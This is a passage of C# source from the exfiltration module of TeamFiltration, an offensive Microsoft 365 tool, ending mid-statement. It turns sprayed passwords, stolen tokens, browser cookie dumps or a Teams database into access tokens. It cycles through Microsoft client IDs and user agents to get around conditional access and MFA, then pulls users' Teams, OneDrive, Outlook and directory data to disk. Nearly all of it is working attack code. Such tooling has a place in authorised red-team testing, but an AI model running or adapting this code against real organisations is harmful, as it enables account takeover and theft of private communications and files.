using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net.Http;
using System.Security.Authentication;
using System.Text.RegularExpressions;
using TeamFiltration.Models.Teams;
using TeamFiltration.Models.MSOL;
using System.Threading.Tasks;
using System.IO;
using TeamFiltration.Handlers;
using TeamFiltration.Models.TeamFiltration;
using TeamFiltration.Helpers;
using KoenZomers.OneDrive.Api;
using KoenZomers.OneDrive.Api.Entities;
using Dasync.Collections;
using TeamFiltration.Models.Graph;
using System.Net;
using System.Text;
using System.IdentityModel.Tokens.Jwt;
using System.Threading;

using System.Data.SQLite;
using System.Web;
using Amazon.Runtime;
using Newtonsoft.Json.Linq;
using ServiceStack.Text;


namespace TeamFiltration.Modules
{

    public class ExifilOptions
    {

        public ExifilOptions(string[] args)
        {
            if (args.Contains("--owa"))
                this.OWA = true;

            if (args.Contains("--aad"))
                this.AAD = true;

            if (args.Contains("--teams"))
                this.Teams = true;

            if (args.Contains("--jwt-tokens"))
                this.Tokens = true;

            if (args.Contains("--onedrive"))
                this.OneDrive = true;


            if (args.Contains("--all"))
            {
                this.OneDrive = true;
                this.Teams = true;
                this.AAD = true;
                this.OWA = true;
                this.Tokens = true;

            }

        }

        public bool OneDrive { get; set; } = false;
        public bool Teams { get; set; } = false;
        public bool OWA { get; set; } = false;
        public bool AAD { get; set; } = false;
        public bool Tokens { get; set; } = false;


    }
    public class Exfiltrate
    {
        private static GlobalArgumentsHandler _globalProperties { get; set; }
        private static DatabaseHandler _databaseHandler { get; set; }
        private static MSOLHandler _msolHandler { get; set; }

        private static async Task PrepareExfil(SprayAttempt accObject, ExifilOptions exfilOptions, bool skip = false)
        {
            /*
             * There are many possible options at this stage
            * 1. Our valid login was blocked by MFA / Conditional access, so we do not have any access token for any resource at this stage
            *   -> We need to enumerate the conditional access policy in order to identify a gap
            * 2. Our valid login was NOT blocked by MFA / Conditional access, and we got an access token
            *  -> We should be able to do whatever we want at this point, however some resources might still be blocked
            * 3. We already have valid token(s) in the database we can use for exfil
            *   -> Determine if any has expired ( access token vs refresh token)
            * 3. Token dead / revoked and/or Credentials have changed -> STOP
            */
            try
            {
                bool forceCDAEnum = false;

                //Pull all valid tokens that has been issued on behalf of this user
                //VALID meaning the refresh token or access_token has not expired
                List<PulledTokens> cachedTokenList = _databaseHandler.TokensAvailable(accObject).OrderByDescending(x => x.DateTime).ToList();

                //We have valid tokens, let's work with them!
                if (cachedTokenList.Count() > 0)
                {
                    //Future token to be used
                    (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) bearerToken = (null, null);

                    //Preferably, we would like an access token for teams
                    IEnumerable<PulledTokens> teamsToken = cachedTokenList.Where(x => new Uri(x.ResourceUri).Host.Equals("api.spaces.skype.com"));


                    //If we have an access token for teams, check if the access_token is still valid, and if not, refresh it
                    if (teamsToken.Count() > 0)
                    {
                        var mostPermissionsTeamsToken = teamsToken.OrderByDescending(x => ((BearerTokenResp)x).scope.Length).FirstOrDefault();

                        //If the access token has expired
                        if (!Helpers.Generic.IsAccessTokenValid(teamsToken.FirstOrDefault().ResponseData, mostPermissionsTeamsToken.DateTime))
                        {
                            //Refresh the token to make sure we have access still
                            //If this failed the token will be automagicly removed as it's useless
                            bearerToken = await _msolHandler.RefreshAttempt(
                                 (BearerTokenResp)mostPermissionsTeamsToken,
                                 _globalProperties.GetBaseUrl(),
                                 mostPermissionsTeamsToken.ResourceUri,
                                 mostPermissionsTeamsToken.ResourceClientId,
                                 false,
                                 true
                                 );

                        }
                        else
                        {
                            //If the access token has not expired, use it
                            bearerToken.bearerToken = (BearerTokenResp)mostPermissionsTeamsToken;
                        }
                    }


                    if (bearerToken.bearerToken == null)
                    {

                        //We don't have Teams, or teams token has expired, get all tokens were access token is valid
                        IEnumerable<PulledTokens> validAccessTokenTokens = cachedTokenList.Where(x => Helpers.Generic.IsAccessTokenValid(x.ResponseData, x.DateTime));


                        //If we do have valid access_tokens 
                        if (validAccessTokenTokens.Count() > 0)
                        {
                            //get the token with the most permissions
                            //TODO: Make an actual check for the access we need to better identify a access token that makes sense for us
                            var mostPermissionsAccessToken = validAccessTokenTokens.OrderByDescending(x => ((BearerTokenResp)x).scope.Length).FirstOrDefault();

                            //Pick the first one
                            bearerToken = ((BearerTokenResp)mostPermissionsAccessToken, null);
                        }
                        else
                        {
                            //We don't have a token with a valid access token, but maybe we can refresh to get one
                            IOrderedEnumerable<PulledTokens> mostPermissionsRefreshTokens = cachedTokenList.OrderByDescending(x => ((BearerTokenResp)x).scope.Length);

                            foreach (PulledTokens mostPermissionsRefreshToken in mostPermissionsRefreshTokens)
                            {

                                //Refresh one
                                //If this failed the token will be automagicly removed as it's useless

                                //If it works they will be stored in the token database
                                bearerToken = await _msolHandler.RefreshAttempt(
                                         (BearerTokenResp)mostPermissionsRefreshToken,
                                         _globalProperties.GetBaseUrl(),
                                         mostPermissionsRefreshToken.ResourceUri,
                                         mostPermissionsRefreshToken.ResourceClientId,
                                         false,
                                         true
                                         );
                            }
                        }
                    }


                    //Attempt to exfil
                    await RefreshExfilAccountAsync(
                        _globalProperties.OutPutPath,
                        bearerToken.bearerToken,
                        exfilOptions,
                        _msolHandler);

                    return;
                }
                //We dont't have any tokens, and we don't have ConditionalAccess, and we have initial response data
                //This is were a newly compromised user would typically land
                else if (!accObject.ConditionalAccess && !string.IsNullOrEmpty(accObject.ResponseData))
                {

                    //No MFA? NICE :) 
                    //Verify that the token has not expired
                    if (Helpers.Generic.IsTokenValid(accObject.ResponseData, accObject.DateTime))
                    {

                        //Parse string into token JSON object
                        BearerTokenResp bearerToken = JsonConvert.DeserializeObject<BearerTokenResp>(accObject?.ResponseData);

                        //Refresh in order to get an fresh copy as well as store in token database for future
                        var crossRefresh = await _msolHandler.RefreshAttempt(
                                 bearerToken,
                                 _globalProperties.GetBaseUrl(),
                                 bearerToken.resource,
                                 accObject.ResourceClientId,
                                 false,
                                 true
                                 );

                        //If this fails, we can remove the responseData, as it's not valid anymore
                        //Check if it failed
                        if (crossRefresh.bearerTokenError != null)
                        {
                            //Check if the token has been revoked / invalid grant
                            if (crossRefresh.bearerTokenError.error.Equals("invalid_grant"))
                            {
                                //If revoked, we have no need for it, remove it
                                //TODO: Instead of removing, maybe mark as revoked? We might wanna keep for later
                                accObject.ResponseData = "";
                                if (_databaseHandler.UpdateAccount(accObject))
                                    _databaseHandler.WriteLog(new Log("EXFIL", $"Updated user account token for resource {accObject.Username}", "") { }, true);
                            }
                        }
                        else
                        {
                            //Simple refresh into teams?
                            //Refresh into a new token valid for Teams
                            //If a valid token for Teams is already in the Database, a token will not be requested
                            var teamsRefresh = await _msolHandler.RefreshAttempt(
                                bearerToken,
                                _globalProperties.GetBaseUrl(),
                                "https://api.spaces.skype.com/",
                                "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
                                true,
                                true
                                );

                            //If so, procceed
                            if (teamsRefresh.bearerToken?.access_token != null)
                            {
                                _databaseHandler.WriteLog(new Log("EXFIL", $"Cross-resource-refresh allowed, we can exfil all that things!", "") { }, true);
                                await RefreshExfilAccountAsync(_globalProperties.OutPutPath, teamsRefresh.bearerToken, exfilOptions, _msolHandler);
                                return;
                            }
                            else
                            {
                                //We failed to refresh into Teams,  //We need to enum the conditional access policy
                                forceCDAEnum = true;

                            }


                        }

                    }

                }

                //If we get to this point we need to enum CDA
                if (accObject.ConditionalAccess || forceCDAEnum)
                {
                    //TODO:Do we need to check if this has been ran before?

                    //Conditonal Access, let's enum
                    _databaseHandler.WriteLog(new Log("EXFIL", $"Attemping to enumerate potential conditional access policy ", "") { }, true);

                    //Enumerate a list of ressources that was can access based on conditional access policy
                    List<EnumeratedConditionalAccess> enumeratedConditionalAccessList = await EnumerateConditionalAccess(accObject.Username, accObject.Password, _msolHandler, true);

                    //If we got any ressources we can access
                    if (enumeratedConditionalAccessList.Count() == 0)
                    {
                        _databaseHandler.WriteLog(new Log("EXFIL", $"Not able to bypass the conditional access policy :(", "") { }, true);
                    }
                    else
                    {
                        //Check if we got a Teams access token from that enum
                        List<PulledTokens> updatedPulledTokens = _databaseHandler.TokensAvailable(accObject);

                        //Let's make all the tokens pretty
                        List<BearerTokenResp> updatedBearertokens = updatedPulledTokens.Select(x => (BearerTokenResp)x).ToList();

                        //We have NO tokens, let's just end it
                        if (updatedBearertokens.Count() == 0)
                        {
                            _databaseHandler.WriteLog(new Log("EXFIL", $"Unable to bypass Conditional Access policy :/", "") { }, true);
                            return;

                        }

                        //Do we have a Teams token?
                        List<BearerTokenResp> teamsToken = updatedBearertokens.Where(x => new Uri(x.resource).Host.Equals("api.spaces.skype.com")).ToList();

                        //If we do NOT have a teams token
                        if (teamsToken.Count() == 0)
                        {
                            //Check if any of the access token we got, can refresh into Teams
                            foreach (var enumeratedConditionalAccess in enumeratedConditionalAccessList)
                            {
                                //Turn that into a bearerToken
                                BearerTokenResp bearerToken = JsonConvert.DeserializeObject<BearerTokenResp>(enumeratedConditionalAccess?.ResponseData);

                                //Refresh into a new token valid for Teams
                                //If a valid token for Teams is already in the Database, a token will not be requested
                                var crossRefresh = await _msolHandler.RefreshAttempt(
                                    bearerToken,
                                    _globalProperties.GetBaseUrl(),
                                    "https://api.spaces.skype.com/",
                                    enumeratedConditionalAccess.ResourceClientId,
                                    true,
                                    true,
                                    enumeratedConditionalAccess.UserAgent
                                    );


                                //If we did refresh into 
                                if (crossRefresh.bearerToken?.access_token != null)
                                {
                                    _databaseHandler.WriteLog(new Log("EXFIL", $"Cross-resource-refresh allowed, we can exfil all that things!", "") { }, true);
                                    try
                                    {
                                        await RefreshExfilAccountAsync(_globalProperties.OutPutPath, crossRefresh.bearerToken, exfilOptions, _msolHandler);
                                        return;
                                    }
                                    catch (Exception ex)
                                    {
                                        break;
                                    }
                                }
                            };

                            //If we get to this point we just need to attempt an exfil with whatever we got
                            await RefreshExfilAccountAsync(_globalProperties.OutPutPath, updatedBearertokens.FirstOrDefault(), exfilOptions, _msolHandler);
                        }
                        else
                        {
                            //We have a teams token and can proceed with a refresh!
                            await RefreshExfilAccountAsync(_globalProperties.OutPutPath, teamsToken.FirstOrDefault(), exfilOptions, _msolHandler);
                        }
                    }



                }

            }
            catch (Exception ex)
            {
                _databaseHandler.WriteLog(new Log("EXFIL", $" SOFT ERROR EXFIL {accObject.Username} => {ex.Message}", "") { }, true);
            }

        }

        public static async Task ExfiltrateAsync(string[] args, string targetUser = "", DatabaseHandler databaseHandler = null)
        {

            if (databaseHandler == null)
                _databaseHandler = new DatabaseHandler(args);
            else
                _databaseHandler = databaseHandler;

            _globalProperties = new GlobalArgumentsHandler(args, _databaseHandler, true);

            _msolHandler = new MSOLHandler(_globalProperties, "EXFIL", _databaseHandler);

            var exfilOptions = new ExifilOptions(args);

            if (!Helpers.Generic.AreYouAnAdult())
                return;

            if (args.Contains("--username") && args.Contains("--password"))
            {

                var username = args.GetValue("--username");
                var password = args.GetValue("--password");


                await PrepareExfilCreds(username, password, exfilOptions);

            }
            else if (args.Contains("--roadtools"))
            {
                string roadAuthFile = args.GetValue("--roadtools");

                if (File.Exists(roadAuthFile))
                {
                    string rawAuthFile = File.ReadAllText(roadAuthFile);
                    try
                    {


                        RoadToolsAuth roadToolsAuth = JsonConvert.DeserializeObject<RoadToolsAuth>(rawAuthFile);
                        JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();

                        JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(roadToolsAuth.accessToken);
                        string userName = Helpers.Generic.GetUsername(jwtSecToken.RawData);
                        Console.WriteLine($"[+] Exfiltrating data from user {userName}");
                        await RefreshExfilAccountAsync(
                          _globalProperties.OutPutPath,
                          (BearerTokenResp)roadToolsAuth,
                          exfilOptions,
                          _msolHandler,
                          clientId: roadToolsAuth._clientId);
                    }
                    catch (JsonException jsonex)
                    {

                        Console.WriteLine($"[!] Failed to parse RoadTools auth JSON file, is the format correct?");
                        Console.WriteLine($"{jsonex.Message}");
                    }
                    catch (Exception ex)
                    {

                        Console.WriteLine($"[!] Failed to exfiltrate using RoadTools auth file");
                        Console.WriteLine($"{ex.Message}");
                    }
                }

            }
            else if (args.Contains("--tokens"))
            {
                //JwtTokenHandler
                JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();

                var tokenDict = new List<(string username, PulledTokens pulledTokens)>() { };

                //parse input
                var jwtToken = args.GetValue("--tokens");


                //Is the input a file?
                if (File.Exists(jwtToken))
                {
                    var tokensArray = File.ReadAllLines(jwtToken);
                    foreach (var possibleToken in tokensArray)
                    {
                        try
                        {

                            JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(possibleToken);
                            PulledTokens parsedTokenObject = Helpers.Generic.ParseSingleAccessToken(jwtSecToken);
                            tokenDict.Add((Helpers.Generic.GetUsername(jwtSecToken.RawData), parsedTokenObject));
                            _databaseHandler.WriteToken(parsedTokenObject);
                        }
                        catch (Exception ex)
                        {

                            Console.WriteLine($"[!] Failed to parse possible JWT token on line {tokensArray.GetIndex(possibleToken)}");
                        }

                    }
                }
                else
                {
                    //Is the input one or many tokens seperated by ,?
                    var splitCharCount = jwtToken.Count(f => f == ',');
                    if (splitCharCount > 0)
                    {
                        foreach (var possibleJwtToken in jwtToken.Split(","))
                        {
                            //Let's attempt to parse this as a single token
                            try
                            {

                                JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(possibleJwtToken);
                                PulledTokens parsedTokenObject = Helpers.Generic.ParseSingleAccessToken(jwtSecToken);
                                tokenDict.Add((Helpers.Generic.GetUsername(jwtSecToken.RawData), parsedTokenObject));
                                _databaseHandler.WriteToken(parsedTokenObject);
                            }
                            catch (Exception ex)
                            {

                                Console.WriteLine($"[!] Failed to parse a possible JWT token that starts with {possibleJwtToken.Substring(0, 15)}...");
                            }
                        }
                    }
                    else
                    {
                        //Let's attempt to parse this as a single token
                        try
                        {

                            JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(jwtToken);
                            PulledTokens parsedTokenObject = Helpers.Generic.ParseSingleAccessToken(jwtSecToken);
                            tokenDict.Add((Helpers.Generic.GetUsername(jwtSecToken.RawData), parsedTokenObject));
                            _databaseHandler.WriteToken(parsedTokenObject);
                        }
                        catch (Exception ex)
                        {

                            Console.WriteLine($"[!] Failed to parse possible JWT token ");
                        }
                    }
                }



                //TODO: Create dummy user to be added into the validUsers database so we can pick up these at an later stage
                //Tokens are now in Database, let's pick each for each username
                foreach (var foundToken in tokenDict.Distinct())
                {

                    Console.WriteLine($"[+] Exfiltrating data from user {foundToken.username}");
                    await RefreshExfilAccountAsync(
                      _globalProperties.OutPutPath,
                      (BearerTokenResp)foundToken.pulledTokens,
                      exfilOptions,
                      _msolHandler);
                }



            }
            else if (args.Contains("--cookie-dump"))
            {
                Console.WriteLine("[+] Reading cookie dump file");
                var inputFile = args.GetValue("--cookie-dump");

                if (File.Exists(inputFile))
                {
                    List<CookieObject> cookieDumpObjects = new List<CookieObject>();
                    try
                    {
                        var cookieData = File.ReadAllText(inputFile);

                        //Really dumb check / "validation"
                        if (cookieData.ToLower().Contains("\"host raw\":"))
                        {

                            //This a dump from FireFox Cookie Quick Manager
                            List<CookieQuickManagerObject> cookieDumpFireFoxObjects = JsonConvert.DeserializeObject<List<CookieQuickManagerObject>>(cookieData);
                            cookieDumpObjects = cookieDumpFireFoxObjects.Select(x => (CookieObject)x).ToList();
                        }
                        else
                        {
                            //This is a dump from SharpChrome
                            List<SharpChromeCookieObject> cookieDumpFireFoxObjects = JsonConvert.DeserializeObject<List<SharpChromeCookieObject>>(cookieData);
                            cookieDumpObjects = cookieDumpFireFoxObjects.Select(x => (CookieObject)x).ToList();

                        }


                        if (cookieDumpObjects.Count() > 0)
                            await CookieExfilAccountAsync(_globalProperties.OutPutPath, cookieDumpObjects, exfilOptions, _msolHandler);
                        else
                            Console.WriteLine("[!] No cookies found in JSON data");
                    }
                    catch (JsonException ex)
                    {
                        Console.WriteLine("[!] Failed to deserialize cookie dump file, does the format match SharpChrome's or 'Cookie Quick Manager' output?");
                        Environment.Exit(0);
                    }


                }
                else
                {
                    Console.WriteLine("[!] Invalid path given, could not find cookie dump!");
                }


            }
            else if (args.Contains("--teams-db"))
            {
                Console.WriteLine("[+] Reading exfiltrated Teams database");

                string filePath = args.GetValue("--teams-db");

                if (File.Exists(filePath) && Helpers.Generic.IsDatabaseFile(filePath))
                {
                    string token = Helpers.Generic.ExtractTokensFromTeams(filePath);
                    if (!string.IsNullOrEmpty(token))
                    {
                        JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();

                        JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(token);
                        PulledTokens parsedTokenObject = Helpers.Generic.ParseSingleAccessToken(jwtSecToken);

                        _databaseHandler.WriteToken(parsedTokenObject);

                        Console.WriteLine($"[+] Exfiltrating data from user {Helpers.Generic.GetUsername(token)}");
                        await RefreshExfilAccountAsync(
                          _globalProperties.OutPutPath,
                          (BearerTokenResp)parsedTokenObject,
                          exfilOptions,
                          _msolHandler);
                    }
                    else
                    {
                        Console.WriteLine("[!] Could not extract useful token from specified Teams database!");
                    }
                }
                else
                {
                    Console.WriteLine("[!] Invalid path given, could not find specified Teams database, or the specified file is not a DB file!");
                }
            }
            else if (!string.IsNullOrEmpty(targetUser))
            {
                var accObject = _databaseHandler.QueryValidLogins().Where(x => x.AADSSO == false && x.Username.ToLower().Equals(targetUser.ToLower())).FirstOrDefault();
                await PrepareExfil(accObject, exfilOptions, true);
            }
            else
            {
                //Query a list of valid logins for users
                var validLogins = _databaseHandler.QueryValidLogins().Where(x => x.AADSSO == false).ToList();

                //If we have any valid logins
                if (validLogins.Count() > 0)
                {

                    int options = 0;
                    Console.WriteLine("\n[+] You can select multiple users using syntax 1,2,3 or 1-3");
                    foreach (var loginObject in validLogins)
                    {
                        Console.WriteLine($"    |-> {options++} - {loginObject.Username}");

                    }
                    Console.WriteLine($"    |-> ALL - Everyone!");
                    Console.WriteLine();
                    Console.Write("[?] What user to target ? #> ");
                    var selection = Console.ReadLine();

                    if (selection.ToLower().StartsWith("ALL".ToLower()))
                    {
                        foreach (SprayAttempt accObject in validLogins)
                        {
                            await PrepareExfil(accObject, exfilOptions);

                        }
                    }
                    else if (selection.Contains("-"))
                    {
                        if (selection.Split("-").Length > 2)
                        {
                            int start = Convert.ToInt32(selection.Split("-")[0]);
                            int end = Convert.ToInt32(selection.Split("-")[1]);
                            foreach (var accObject in validLogins.GetRange(start, end - start))
                            {
                                await PrepareExfil(accObject, exfilOptions);

                            }
                        }
                        else
                        {
                            Console.WriteLine("[+] Provided format must be <START INDEX>-<STOP INDEX>");
                        }
                    }
                    else if (selection.Contains(","))
                    {
                        var intArray = selection.Split(",").Select(x => Convert.ToInt32(x));

                        foreach (var intSelection in intArray)
                        {
                            await PrepareExfil(validLogins[intSelection], exfilOptions);
                        }
                    }
                    else
                    {
                        var accObject = validLogins[Convert.ToInt32(selection)];

                        await PrepareExfil(accObject, exfilOptions);
                    }
                }

            }
        }
        private static async Task<List<EnumeratedConditionalAccess>> EnumFamilyRefreshTokens(BearerTokenResp validToken, MSOLHandler msolHandler)
        {
            var validResList = new List<EnumeratedConditionalAccess> { };

            var proxyURL = _globalProperties.GetBaseUrl();

            List<string> officeResourceList = Helpers.Generic.officeResources();

            List<(string userAgent, string platform)> userAgentList = Helpers.Generic.userAgents();

            //For each target resource (Data)

            var clientIdList = new List<(string clientId, string clientName)>{
                    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Microsoft Teams"),
                    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Microsoft Azure CLI"),
                    ("1950a258-227b-4e31-a9cf-717495945fc2", "Microsoft Azure PowerShell"),
                    ("00b41c95-dab0-4487-9791-b9d2c32c80f2", "Office 365 Management"),
                    ("26a7ee05-5602-4d76-a7ba-eae8b7b67941", "Windows Search"),
                    ("27922004-5251-4030-b22d-91ecd9a37ea4", "Outlook Mobile"),
                    ("4813382a-8fa7-425e-ab75-3b753aab3abb", "Microsoft Authenticator App"),
                    ("ab9b8c07-8f02-4f72-87fa-80105867a763", "OneDrive SyncEngine"),
                    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Microsoft Office"),
                    ("872cd9fa-d31f-45e0-9eab-6e460a02d1f1", "Visual Studio"),
                    ("af124e86-4e96-495a-b70a-90f90ab96707", "OneDrive iOS App"),
                    ("2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8", "Microsoft Bing Search for Microsoft Edge"),
                    ("844cca35-0656-46ce-b636-13f48b0eecbd", "Microsoft Stream Mobile Native"),
                    ("87749df4-7ccf-48f8-aa87-704bad0e0e16", "Microsoft Teams - Device Admin Agent"),
                    ("cf36b471-5b44-428c-9ce7-313bf84528de", "Microsoft Bing Search"),
                    ("0ec893e0-5785-4de6-99da-4ed124e5296c", "Office UWP PWA"),
                    ("22098786-6e16-43cc-a27d-191a01a1e3b5", "Microsoft To-Do client"),
                    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Outlook"),
                    ("ab9b8c07-8f02-4f72-87fa-80105867a763", "OneNote")
                };


            //For each built in AAD Client ID (Application)
            foreach (var clientId in clientIdList)
            {
                //If we already have a token for this resource, there is no need to request another one
                //TODO: UNLESS we want to increase our permission for the resource??

                //Let it be known that we have access!
                //_databaseHandler.WriteLog(new Log("EXFIL", $" URI: { officeResourceList[i] } APP: {clientId.application} PLATFORM: {userAgent.platform} => CAN ACCESS", "[US]") { }, true);

                (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) validResponse = (null, null);

                //Turn that into a bearerToken
                //  validResponse.bearerToken = JsonConvert.DeserializeObject<BearerTokenResp>(conditionalAccessAttempt?.ResponseData);

                //Refresh into that clientID first?
                var crossRefresh = await msolHandler.RefreshAttempt(
                    validToken,
                    _globalProperties.GetBaseUrl(),
                    validToken.resource,
                    clientId.clientId,
                    false,
                    true,
                    //   userAgent: userAgent,
                    scope: "openid"
                    );


                if (crossRefresh.bearerToken != null)
                {
                    //Do we now have a family refresh token?
                    //Have we identifed a bypass / a token we can use to refresh into another resource?
                    var newScopeRefresh = await msolHandler.RefreshAttempt(
                        crossRefresh.bearerToken,
                        _globalProperties.GetBaseUrl(),
                         validToken.resource,
                        clientId.clientId,
                        false,
                        true,
                        //  userAgent: userAgent,
                        scope: "https://api.spaces.skype.com/.default"
                        );
                }

            }
            return validResList;
        }

        private static async Task<List<EnumeratedConditionalAccess>> EnumerateConditionalAccess(string username, string password, MSOLHandler msolHandler, bool stopAtValid = false)
        {
            var validResList = new List<EnumeratedConditionalAccess> { };


            #region userCreds

            #endregion
            var proxyURL = _globalProperties.GetBaseUrl();

            List<string> officeResourceList = Helpers.Generic.officeResources();
            List<(string clientId, string application)> clientIdList = Helpers.Generic.clientIds();
            List<(string userAgent, string platform)> userAgentList = Helpers.Generic.userAgents();

            //For each target resource (Data)



            for (int i = 0; i < officeResourceList.Count; i++)
            {
                //For each built in AAD Client ID (Application)
                foreach (var clientId in clientIdList)
                {
                    //For each useragent - Platform
                    foreach (var userAgent in userAgentList)
                    {

                        //If we already have a token for this resource, there is no need to request another one
                        //TODO: UNLESS we want to increase our permission for the resource??
                        if (_databaseHandler.QueryToken(username, officeResourceList[i]).Count() > 0)
                        {
                            //Skip unless we are at last resource
                            if (i < officeResourceList.Count() - 1)
                            {
                                i++;
                                break;
                            }
                            else
                            {
                                //If we are at last resc, and already have access, just return list
                                return validResList;
                            }

                        }

                        //Attempt to login and get an access token
                        var loginResp = await msolHandler.LoginAttemptFireProx(username, password, proxyURL, (officeResourceList[i], clientId.Item1), true, userAgent.userAgent);

                        //Check if we have invalid creds, in that case abort!
                        if (loginResp.bearerTokenError != null)
                        {
                            var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();

                            //Set a default response
                            var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);

                            //Try to parse
                            Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);

                            if (!errorCodeOut.valid)
                            {
                                //Creds has changed, remove the user!
                                Console.WriteLine($"[!] Credentials identfied earlier for {username} are no longer valid, marking as invalid account");
                                var validAccount = _databaseHandler.QueryValidLogin(username);
                                validAccount.Valid = false;
                                _databaseHandler.UpdateAccount(validAccount);
                                return new List<EnumeratedConditionalAccess> { };
                            }
                        }

                        //We got an access token
                        if (loginResp.bearerTokenError == null && loginResp.bearerToken != null)
                        {
                            //Note this down
                            var conditionalAccessAttempt = new EnumeratedConditionalAccess()
                            {
                                ResourceClientId = clientId.clientId,
                                ResourceUri = officeResourceList[i],
                                Username = username,
                                UserAgent = userAgent.userAgent,
                                ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken)
                            };

                            //Let it be known that we have access!
                            _databaseHandler.WriteLog(new Log("EXFIL", $" URI: {officeResourceList[i]} APP: {clientId.application} PLATFORM: {userAgent.platform} => CAN ACCESS", "[US]") { }, true);

                            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) validResponse = (null, null);

                            //Turn that into a bearerToken
                            validResponse.bearerToken = JsonConvert.DeserializeObject<BearerTokenResp>(conditionalAccessAttempt?.ResponseData);

                            validResList.Add(conditionalAccessAttempt);
                            _databaseHandler.WriteEnumeratedConditionalAccess(conditionalAccessAttempt);

                            if (stopAtValid)
                                return validResList;



                        }
                        else
                        {
                            var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
                            var message = loginResp.bearerTokenError.error_description.Split(":")[1].Trim();

                            //Set a default response
                            var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);

                            //Try to parse
                            Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);

                            _databaseHandler.WriteLog(new Log("EXFIL", $" URI: {officeResourceList[i]} APP: {clientId.application} PLATFORM: {userAgent.platform} => {errorCodeOut.msg}", "[US]") { }, true);

                        }
                    }

                }
            }
            return validResList;
        }

        private static async Task PrepareExfilCreds(string username, string password, ExifilOptions exfilOptions)
        {

            //We need to check if these creds belong to an user we can actually exfiltrate infromation from, aka no adfs!
            var getUserRealmResult = await Helpers.Generic.CheckUserRealm(username, _globalProperties);

            if (getUserRealmResult.UsGovCloud)
            {
                _databaseHandler.WriteLog(new Log("SPRAY", $"US GOV Tenant detected - Updating spraying endpoint from .com => .us"));
                _globalProperties.UsCloud = true;
            }

            if (getUserRealmResult.ThirdPartyAuth && !getUserRealmResult.Adfs)
            {
                _databaseHandler.WriteLog(new Log("SPRAY", $"Third party authentication detected - exfil will not work, sorry!\nThird-Party Authentication url: " + getUserRealmResult.ThirdPartyAuthUrl));
                Environment.Exit(0);
            }


            //Check if this client has ADFS
            if (getUserRealmResult.Adfs && !_globalProperties.AADSSO)
            {
                _databaseHandler.WriteLog(new Log("SPRAY", $"ADFS federation detected , exfil will not work"));
                Environment.Exit(0);

            }

            var randomResource = Helpers.Generic.RandomO365Res();

            var sprayAttempt = new SprayAttempt()
            {
                Username = username,
                Password = password,
                //ComboHash = "",
                FireProxURL = _globalProperties.GetBaseUrl(),
                FireProxRegion = "NONE", //fireProxObject.Item2.Region,
                ResourceClientId = randomResource.clientId,
                ResourceUri = randomResource.Uri,
                AADSSO = false, //_globalProperties.AADSSO,
                ADFS = false, //getUserRealmResult.Adfs
            };


            //Attempt to login once in order to confirm creds are infact valid, as well as parse the information into the database
            var sprayedAttempt = await Spray.SprayAttemptWrap(sprayAttempt, _globalProperties, _databaseHandler, getUserRealmResult);

            if (sprayedAttempt.Valid)
                await PrepareExfil(sprayedAttempt, exfilOptions, true);


            return;

        }
        private static async Task RefreshExfilAccountAsync(string outpath, BearerTokenResp inputTokenData, ExifilOptions exifilOptions, MSOLHandler msolHandler, string clientId = "1fec8e78-bce4-4aaf-ab1b-5451cc387264")
        {
            //Extract the username from the initial JWT token
            string username = Helpers.Generic.GetUsername(inputTokenData.access_token);
            //Create the output path based on this
            var baseUserOutPath = Path.Combine(outpath, Helpers.Generic.MakeValidFileName(username));
            Directory.CreateDirectory(baseUserOutPath);

            //Declare a bunch of empty tokens objects
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) companySharePointToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) personalOneDriveToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) outlookToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) msGraphToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) adGraphToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) teamsToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) azurePSToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });

            //If we want to exfil -aad
            if (exifilOptions.AAD)
            {

                if (adGraphToken.bearerToken?.access_token == null)
                    adGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.windows.net", clientId: clientId);

                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com", clientId: clientId);

                if (msGraphToken.bearerToken?.access_token != null)
